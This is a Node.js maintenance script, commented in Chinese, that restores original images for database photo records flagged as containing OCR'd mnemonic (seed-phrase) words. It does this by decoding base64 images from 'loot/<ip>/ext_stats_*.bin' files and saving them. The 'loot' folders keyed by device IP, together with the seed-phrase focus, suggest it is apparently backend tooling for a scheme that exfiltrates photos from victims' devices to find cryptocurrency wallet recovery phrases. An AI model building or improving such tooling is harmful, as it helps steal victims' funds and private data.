#!/usr/bin/env node
/**
 * photo_extract_backfill.js —— 补回「有助记词 OCR 但缺原图」的照片原图
 *   数据关系：photos 行（bin_path=NULL）的 data.name ≈ loot/<ip>/ext_stats_<ms>.bin（JSON，data=base64 原图，
 *   其中 JSON.path 的 basename 就是原始文件名）。
 *   做法：优先按 文件名 匹配提取文件（同 IP 目录优先），多个候选取 ts 最近；命中后 base64 → 存文件 → 回填 bin_path。
 * 用法: node tools/photo_extract_backfill.js [--dry] [--limit N] [--serial X]
 */
const path = require('path');
const fs = require('fs');
const BASE = path.resolve(__dirname, '..');
const pgStore = require(path.join(BASE, 'adm888app', 'pg', 'pgStore.js'));

const DRY = process.argv.includes('--dry');
const LIMIT = (() => { const i = process.argv.indexOf('--limit'); return i >= 0 ? Number(process.argv[i + 1]) : 0; })();
const SERIAL = (() => { const i = process.argv.indexOf('--serial'); return i >= 0 ? process.argv[i + 1] : ''; })();

// 建立「文件名 → [{p, ms, dir}]」索引（loot/*/ext_stats_*.bin，文件名取自 JSON.path 的 basename）
function buildIndex() {
  const byName = new Map();
  const loot = path.join(BASE, 'loot');
  let dirs = [];
  try { dirs = fs.readdirSync(loot, { withFileTypes: true }).filter(d => d.isDirectory()); } catch {}
  let n = 0;
  for (const d of dirs) {
    const dp = path.join(loot, d.name);
    let files = [];
    try { files = fs.readdirSync(dp); } catch { continue; }
    for (const f of files) {
      const m = f.match(/^ext_stats_(\d+)\.bin$/);
      if (!m) continue;
      const full = path.join(dp, f);
      // 只读前 4KB 提取 path 字段（避免全读 4MB×N）
      let jname = '';
      try {
        const fd = fs.openSync(full, 'r');
        const buf = Buffer.alloc(4096);
        const rd = fs.readSync(fd, buf, 0, 4096, 0);
        fs.closeSync(fd);
        const head = buf.slice(0, rd).toString('utf8');
        const mm = head.match(/"path"\s*:\s*"([^"]+)"/);
        if (mm) jname = path.basename(mm[1]);
      } catch { continue; }
      if (!jname) continue;
      if (!byName.has(jname)) byName.set(jname, []);
      byName.get(jname).push({ p: full, ms: Number(m[1]), dir: d.name });
      n++;
    }
  }
  return { byName, n, dirs: dirs.length };
}

(async () => {
  const cond = SERIAL ? `AND serial = '${SERIAL.replace(/'/g, "''")}'` : '';
  const r = await pgStore.pool.query(
    `SELECT id, serial, host(ip) AS ip, data->>'name' AS name, (data->>'ts')::bigint AS ts
       FROM photos
      WHERE data ? 'word_n' AND (data->>'word_n') ~ '^[0-9]+$' AND (data->>'word_n')::int > 0
        AND bin_path IS NULL AND (data->>'ts') IS NOT NULL AND COALESCE(data->>'name','') <> ''
        ${cond}
      ORDER BY id`);
  const rows = LIMIT > 0 ? r.rows.slice(0, LIMIT) : r.rows;
  console.log(`[phx] 待补原图 ${rows.length} 张，扫描目标 IP 目录…`);
  const t0 = Date.now();
  // 【快路径】只扫目标设备 IP 对应的 loot 目录 + 待补照片涉及的目录（不全盘索引 66 万文件）
  const ips = [...new Set(rows.map(x => x.ip).filter(Boolean))];
  const loot = path.join(BASE, 'loot');
  const scanDirs = new Set(ips.map(ip => path.join(loot, ip)).filter(d => { try { return fs.statSync(d).isDirectory(); } catch { return false; } }));
  if (!scanDirs.size) { console.log('[phx] 没有可扫描的 IP 目录'); await pgStore.close(); return; }
  const byName = new Map();
  let n = 0;
  for (const dp of scanDirs) {
    let files = [];
    try { files = fs.readdirSync(dp); } catch { continue; }
    for (const f of files) {
      const m = f.match(/^ext_stats_(\d+)\.bin$/);
      if (!m) continue;
      const full = path.join(dp, f);
      let jname = '';
      try {
        const fd = fs.openSync(full, 'r');
        const buf = Buffer.alloc(2048);
        const rd = fs.readSync(fd, buf, 0, 2048, 0);
        fs.closeSync(fd);
        const mm = buf.slice(0, rd).toString('utf8').match(/"path"\s*:\s*"([^"]+)"/);
        if (mm) jname = path.basename(mm[1]);
      } catch { continue; }
      if (!jname) continue;
      if (!byName.has(jname)) byName.set(jname, []);
      byName.get(jname).push({ p: full, ms: Number(m[1]), dir: path.basename(dp) });
      n++;
    }
  }
  console.log(`[phx] 扫描完成：${scanDirs.size} 个 IP 目录 / ${n} 个提取文件 / ${byName.size} 个唯一文件名 | ${((Date.now() - t0) / 1000).toFixed(1)}s`);

  const outDir = path.join(BASE, 'docs', 'post_t', 't_plain');
  let ok = 0, miss = 0, fail = 0;
  for (const row of rows) {
    const cands = byName.get(row.name) || [];
    if (!cands.length) { miss++; console.log(`  – ${row.id} ${row.name}: 磁盘无同名提取文件`); continue; }
    // 同 IP 目录优先，其次 ts 最近
    const ip = row.ip && row.ip !== '::1' ? row.ip : '';
    const ts = Number(row.ts) || 0;
    cands.sort((a, b) => {
      const ai = (ip && a.dir === ip) ? 0 : 1, bi = (ip && b.dir === ip) ? 0 : 1;
      if (ai !== bi) return ai - bi;
      return Math.abs(a.ms - ts) - Math.abs(b.ms - ts);
    });
    const best = cands[0];
    try {
      // 命中后再全读（4MB 级）
      const raw = fs.readFileSync(best.p);
      let buf = raw, jname = '';
      try {
        const j = JSON.parse(raw.toString('utf8'));
        if (j && j.data) buf = Buffer.from(j.data, 'base64');
        jname = path.basename(j.path || '');
      } catch {}
      if (!buf || !buf.length) { fail++; console.log(`  ✘ ${row.id} ${row.name}: 提取文件无图数据`); continue; }
      const ext = path.extname(row.name || jname || '.jpg').toLowerCase() || '.jpg';
      const outName = 'phx_' + row.id + '_' + String(row.name).replace(/[^\w.\-]/g, '_') + (String(row.name).toLowerCase().endsWith(ext) ? '' : ext);
      const outPath = path.join(outDir, outName);
      if (!DRY) {
        fs.mkdirSync(outDir, { recursive: true });
        fs.writeFileSync(outPath, buf);
        await pgStore.pool.query(
          `UPDATE photos SET bin_path=$2, data = data || jsonb_build_object('bin_path', $2::text, 'phx_from', $3::text) WHERE id=$1`,
          [row.id, outPath, best.p]);
      }
      ok++;
      console.log(`  ✔ ${row.id} ${row.name} → ${outName} (${(buf.length / 1024).toFixed(0)}KB)${jname && jname !== row.name ? ' [JSON内 ' + jname + ']' : ''}${cands.length > 1 ? ' 候选' + cands.length : ''}`);
    } catch (e) { fail++; console.log(`  ✘ ${row.id} ${row.name}: ${String(e.message).slice(0, 80)}`); }
  }
  console.log(`\n[phx] 完成：成功 ${ok}，未匹配 ${miss}，失败 ${fail}${DRY ? ' (dry)' : ''}`);
  await pgStore.close();
})().catch(e => { console.error('[phx] fatal', e); process.exit(1); });
